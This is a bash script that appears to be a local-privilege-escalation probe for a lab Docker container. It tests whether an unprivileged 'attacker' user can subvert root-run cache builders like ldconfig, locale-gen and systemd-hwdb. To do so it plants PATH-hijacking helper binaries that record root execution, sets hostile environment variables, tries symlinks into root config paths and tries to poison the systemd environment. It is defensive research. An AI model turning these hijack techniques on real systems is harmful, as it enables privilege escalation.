#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/system-cache-builders.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n## %s\n' "$1"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "system cache builder trust-boundary probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=system_cache_builders_probe
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /root/${probe}* 2>/dev/null || true
if [ -e /tmp/${probe}.dmesg.backup ]; then
  cp -a /tmp/${probe}.dmesg.backup /var/log/dmesg 2>/dev/null || true
  rm -f /tmp/${probe}.dmesg.backup
fi
systemctl reset-failed ldconfig.service systemd-journal-catalog-update.service dmesg.service \
  systemd-update-done.service systemd-hwdb-update.service kmod-static-nodes.service 2>/dev/null || true
true
TARGET

target_root "target identity and package versions" <<'TARGET'
set +e
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
runuser -u "$ATTACKER" -- bash -lc 'id; groups; command -v sudo >/dev/null && sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== package versions =="
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
  libc-bin libc6 systemd systemd-dev systemd-hwe-hwdb kmod locales util-linux bsdutils \
  console-setup keyboard-configuration 2>/dev/null | sort

echo
echo "== helper paths =="
for c in ldconfig journalctl savelog locale-gen localedef systemd-hwdb kmod systemd-tmpfiles; do
  command -v "$c" 2>/dev/null || true
done
TARGET

target_root "default units, triggers, and implementation excerpts" <<'TARGET'
set +e
echo "== systemd units =="
for u in ldconfig.service systemd-journal-catalog-update.service dmesg.service \
  systemd-update-done.service systemd-hwdb-update.service kmod-static-nodes.service; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState -p Result \
    -p ConditionResult -p FragmentPath -p User -p Group -p Environment \
    -p PassEnvironment -p ExecStart -p ExecStartPre -p ExecStartPost "$u" 2>&1 || true
done

echo
echo "== unit source with line numbers =="
for f in /usr/lib/systemd/system/ldconfig.service \
  /usr/lib/systemd/system/systemd-journal-catalog-update.service \
  /usr/lib/systemd/system/dmesg.service \
  /usr/lib/systemd/system/systemd-update-done.service \
  /usr/lib/systemd/system/systemd-hwdb-update.service \
  /usr/lib/systemd/system/kmod-static-nodes.service; do
  echo "### $f"
  [ -e "$f" ] && nl -ba "$f" | sed -n '1,90p' || echo MISSING
done

echo
echo "== dpkg trigger and maintainer-script roots =="
for f in /var/lib/dpkg/info/libc-bin.postinst /var/lib/dpkg/info/libc-bin.triggers \
  /var/lib/dpkg/info/locales.config /var/lib/dpkg/info/locales.postinst \
  /usr/sbin/locale-gen /usr/bin/savelog; do
  echo "### $f"
  if [ -e "$f" ]; then
    stat -Lc '%A %a %U:%G %n' "$f"
    grep -nE 'ldconfig|locale-gen|localedef|/usr/local|SUPPORTED|USER_LOCALES|PATH=|chown|chmod|chgrp|gzip|mv|ln|tmp|TMPDIR|mktemp' "$f" 2>/dev/null | sed -n '1,120p' || true
  else
    echo MISSING
  fi
done
TARGET

target_root "ownership and attacker writability boundary map" <<'TARGET'
set +e
echo "== relevant roots =="
paths="/etc/ld.so.conf /etc/ld.so.conf.d /etc/ld.so.cache /usr/local /usr/local/lib /usr/local/lib/aarch64-linux-gnu /lib /usr/lib /usr/lib/aarch64-linux-gnu /usr/lib/systemd/catalog /etc/systemd/catalog /usr/local/lib/systemd/catalog /var/lib/systemd/catalog /var/lib/systemd/catalog/database /var/log /var/log/dmesg /etc/locale.gen /usr/share/i18n /usr/share/i18n/SUPPORTED /usr/local/share /usr/local/share/i18n /usr/local/share/i18n/SUPPORTED /etc/udev/hwdb.d /usr/lib/udev/hwdb.d /usr/lib/udev/hwdb.bin /etc/udev/hwdb.bin /run/tmpfiles.d /run/tmpfiles.d/static-nodes.conf /lib/modules/$(uname -r) /lib/modules/$(uname -r)/modules.devname"
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p"
  else
    echo "MISSING $p"
  fi
done

echo
echo "== directory contents =="
find /etc/ld.so.conf.d /usr/local/lib /usr/lib/systemd/catalog /var/lib/systemd/catalog \
  /etc/udev/hwdb.d /usr/lib/udev/hwdb.d /usr/local/share/i18n -maxdepth 2 \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort | sed -n '1,220p'

echo
echo "== attacker writable checks =="
runuser -u "$ATTACKER" -- bash -s <<'ATTACKER'
set +e
id
paths="/etc/ld.so.conf.d /usr/local /usr/local/lib /usr/local/lib/aarch64-linux-gnu /usr/lib/systemd/catalog /etc/systemd/catalog /usr/local/lib/systemd/catalog /var/lib/systemd/catalog /var/lib/systemd/catalog/database /var/log /var/log/dmesg /etc/locale.gen /usr/share/i18n /usr/share/i18n/SUPPORTED /usr/local/share /usr/local/share/i18n /usr/local/share/i18n/SUPPORTED /etc/udev/hwdb.d /usr/lib/udev/hwdb.d /usr/lib/udev/hwdb.bin /etc/udev/hwdb.bin /run/tmpfiles.d /run/tmpfiles.d/static-nodes.conf /lib/modules/$(uname -r) /lib/modules/$(uname -r)/modules.devname /tmp /var/tmp"
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    if [ -w "$p" ]; then echo "W $p"; else echo "NO_W $p"; fi
  else
    echo "MISSING $p"
  fi
done
ATTACKER
TARGET

target_attacker "attacker write, symlink, and direct helper attempts" <<'ATTACKER'
set +e
probe=system_cache_builders_probe
base="$HOME/$probe"
rm -rf "$base"
mkdir -p "$base/bin" "$base/tmp" "$base/lib" "$base/catalog" "$base/i18n/locales" "$base/udev" "$base/log"

for h in chown chmod chgrp gzip mv cp touch rm ln localedef ldconfig journalctl systemd-hwdb kmod savelog; do
  cat > "$base/bin/$h" <<'EOF'
#!/usr/bin/env bash
name="$(basename "$0")"
{
  echo "$name uid=$(id -u) euid=$(id -u) args=$*"
  id
} >> /tmp/system_cache_builders_probe.helper_hits
if [ "$(id -u)" = 0 ]; then
  id > /root/system_cache_builders_probe.root
fi
case "$name" in
  localedef) exit 0 ;;
  ldconfig|journalctl|systemd-hwdb|kmod|savelog) exit 0 ;;
esac
exec "/usr/bin/$name" "$@" 2>/dev/null || exec "/bin/$name" "$@" 2>/dev/null || exit 0
EOF
  chmod 755 "$base/bin/$h"
done

try_file() {
  local p="$1"
  printf 'write %s -> ' "$p"
  if bash -c 'printf "probe\n" > "$1"' bash "$p" 2>"$base/write.err"; then
    echo OK
    rm -f "$p"
  else
    sed -n '1p' "$base/write.err"
  fi
  rm -f "$base/write.err"
}

try_mkdir() {
  local p="$1"
  printf 'mkdir %s -> ' "$p"
  if mkdir -p "$p" 2>"$base/mkdir.err"; then
    echo OK
    rmdir "$p" 2>/dev/null || true
  else
    sed -n '1p' "$base/mkdir.err"
  fi
  rm -f "$base/mkdir.err"
}

try_link() {
  local p="$1"
  printf 'symlink %s -> ' "$p"
  if ln -s /root/system_cache_builders_probe.link_target "$p" 2>"$base/link.err"; then
    echo OK
    rm -f "$p"
  else
    sed -n '1p' "$base/link.err"
  fi
  rm -f "$base/link.err"
}

echo "== write and symlink attempts into root cache/config inputs =="
try_file /etc/ld.so.conf.d/zz-system-cache-builders.conf
try_file /usr/local/lib/libsystem_cache_builders.so
try_mkdir /usr/local/lib/systemd/catalog
try_file /usr/local/lib/systemd/catalog/system-cache-builders.catalog
try_file /usr/lib/systemd/catalog/system-cache-builders.catalog
try_mkdir /etc/systemd/catalog
try_file /etc/systemd/catalog/system-cache-builders.catalog
try_file /var/lib/systemd/catalog/database
try_file /var/log/dmesg
try_file /etc/locale.gen
try_mkdir /usr/local/share/i18n
try_file /usr/local/share/i18n/SUPPORTED
try_mkdir /usr/local/share/i18n/locales
try_file /usr/local/share/i18n/locales/system_cache_builders
try_file /etc/udev/hwdb.d/90-system-cache-builders.hwdb
try_file /usr/lib/udev/hwdb.d/90-system-cache-builders.hwdb
try_file /etc/udev/hwdb.bin
try_file /usr/lib/udev/hwdb.bin
try_file "/lib/modules/$(uname -r)/modules.devname"
try_file /run/tmpfiles.d/static-nodes.conf

try_link /etc/ld.so.conf.d/zz-system-cache-builders.conf
try_link /var/lib/systemd/catalog/database
try_link /var/log/dmesg
try_link /etc/locale.gen
try_link /run/tmpfiles.d/static-nodes.conf

echo
echo "== attacker direct helper runs with hostile env =="
export PATH="$base/bin:$PATH"
export TMPDIR="$base/tmp"
export LOCPATH="$base/locpath"
export GCONV_PATH="$base/gconv"
export SYSTEMD_LOG_LEVEL=debug
mkdir -p "$LOCPATH" "$GCONV_PATH"
printf 'INPUT(-lnope)\n' > "$base/ld.so.conf"
printf 'x\n' > "$base/log/dmesg"
printf 'en_US.UTF-8 UTF-8\n' > "$base/i18n/SUPPORTED"
printf 'escape_char /\ncomment_char %%\nLC_IDENTIFICATION\nEND LC_IDENTIFICATION\n' > "$base/i18n/locales/system_cache_builders"

ldconfig -n "$base/lib"; echo "attacker_ldconfig_rc=$?"
journalctl --update-catalog --root="$base" 2>&1 | sed -n '1,80p'; echo "attacker_journalctl_catalog_rc=${PIPESTATUS[0]}"
savelog -m640 -q -p -n -c 2 "$base/log/dmesg"; echo "attacker_savelog_rc=$?"
locale-gen --keep-existing 2>&1 | sed -n '1,80p'; echo "attacker_locale_gen_rc=${PIPESTATUS[0]}"
systemd-hwdb update --root="$base" 2>&1 | sed -n '1,80p'; echo "attacker_hwdb_rc=${PIPESTATUS[0]}"
kmod static-nodes --format=tmpfiles --output="$base/static-nodes.conf" 2>&1 | sed -n '1,80p'; echo "attacker_kmod_rc=${PIPESTATUS[0]}"

echo
echo "== helper hits from direct attacker runs =="
if [ -e /tmp/system_cache_builders_probe.helper_hits ]; then
  sed -n '1,160p' /tmp/system_cache_builders_probe.helper_hits
else
  echo NO_HELPER_HITS
fi
ATTACKER

target_attacker "attacker attempts to trigger default root units" <<'ATTACKER'
set +e
for u in ldconfig.service systemd-journal-catalog-update.service dmesg.service \
  systemd-update-done.service systemd-hwdb-update.service kmod-static-nodes.service; do
  echo "### systemctl start $u as uid$(id -u)"
  systemctl start "$u" 2>&1 | sed -n '1,8p'
  echo "rc=${PIPESTATUS[0]}"
done

echo
echo "== attempts to poison root systemd environment =="
base="$HOME/system_cache_builders_probe"
systemctl set-environment "PATH=$base/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" 2>&1 | sed -n '1,8p'
echo "setenv_path_rc=${PIPESTATUS[0]}"
TMPDIR="$base/tmp" systemctl import-environment TMPDIR PATH 2>&1 | sed -n '1,8p'
echo "importenv_rc=${PIPESTATUS[0]}"
ATTACKER

target_root "root-triggered checks after hostile attacker state" <<'TARGET'
set +e
probe=system_cache_builders_probe
rm -f /tmp/${probe}.helper_hits /root/${probe}.root

echo "== root environment =="
systemctl show-environment 2>/dev/null | sort || true
echo "root PATH=$PATH TMPDIR=${TMPDIR:-}"

echo
echo "== backup /var/log/dmesg =="
if [ -e /var/log/dmesg ]; then
  cp -a /var/log/dmesg /tmp/${probe}.dmesg.backup
  stat -Lc 'backup %A %a %U:%G %s %n' /tmp/${probe}.dmesg.backup
else
  echo "no existing /var/log/dmesg"
fi

echo
echo "== direct default-root helper executions =="
/sbin/ldconfig -X; echo "root_ldconfig_rc=$?"
journalctl --update-catalog; echo "root_journalctl_catalog_rc=$?"
/usr/bin/savelog -m640 -q -p -n -c 2 /var/log/dmesg; echo "root_savelog_rc=$?"
/usr/sbin/locale-gen --keep-existing 2>&1 | sed -n '1,80p'; echo "root_locale_gen_rc=${PIPESTATUS[0]}"
/usr/bin/systemd-hwdb update 2>&1 | sed -n '1,80p'; echo "root_hwdb_rc=${PIPESTATUS[0]}"
/usr/bin/kmod static-nodes --format=tmpfiles --output=/run/tmpfiles.d/static-nodes.conf 2>&1 | sed -n '1,80p'; echo "root_kmod_rc=${PIPESTATUS[0]}"

echo
echo "== default root unit starts =="
for u in ldconfig.service systemd-journal-catalog-update.service dmesg.service \
  systemd-update-done.service systemd-hwdb-update.service kmod-static-nodes.service; do
  echo "### root systemctl start $u"
  systemctl start "$u" 2>&1 | sed -n '1,12p'
  echo "rc=${PIPESTATUS[0]}"
  systemctl show -p ActiveState -p SubState -p Result -p ConditionResult "$u" 2>/dev/null || true
done

echo
echo "== root payload check =="
if [ -e /tmp/${probe}.helper_hits ]; then
  echo "HELPER_HITS_AFTER_ROOT"
  sed -n '1,160p' /tmp/${probe}.helper_hits
else
  echo "NO_HELPER_HITS_AFTER_ROOT"
fi
if [ -e /root/${probe}.root ]; then
  echo "ROOT_MARKER_PRESENT"
  cat /root/${probe}.root
else
  echo "NO_ROOT_MARKER"
fi
TARGET

target_root "cleanup after probe and health check" <<'TARGET'
set +e
probe=system_cache_builders_probe
if [ -e /tmp/${probe}.dmesg.backup ]; then
  cp -a /tmp/${probe}.dmesg.backup /var/log/dmesg 2>/dev/null || true
  rm -f /tmp/${probe}.dmesg.backup
fi
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /root/${probe}* 2>/dev/null || true
rm -f /run/tmpfiles.d/static-nodes.conf 2>/dev/null || true
systemctl reset-failed ldconfig.service systemd-journal-catalog-update.service dmesg.service \
  systemd-update-done.service systemd-hwdb-update.service kmod-static-nodes.service 2>/dev/null || true
echo "== remaining probe files =="
find "/home/${ATTACKER}" /tmp /root -maxdepth 2 -name "${probe}*" -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
echo "== health =="
systemctl is-system-running
systemctl --failed --no-legend | wc -l
TARGET
